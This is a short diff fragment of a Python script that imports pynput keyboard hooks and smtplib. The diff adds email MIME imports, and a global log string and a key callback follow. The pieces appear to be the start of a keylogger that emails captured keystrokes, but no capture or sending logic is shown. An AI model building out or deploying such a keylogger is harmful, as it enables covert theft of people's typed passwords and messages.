@@ -1,7 +1,9 @@
 import threading
-
 import pynput.keyboard
 import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
 log = ""
 def callback_function(key):
     global log
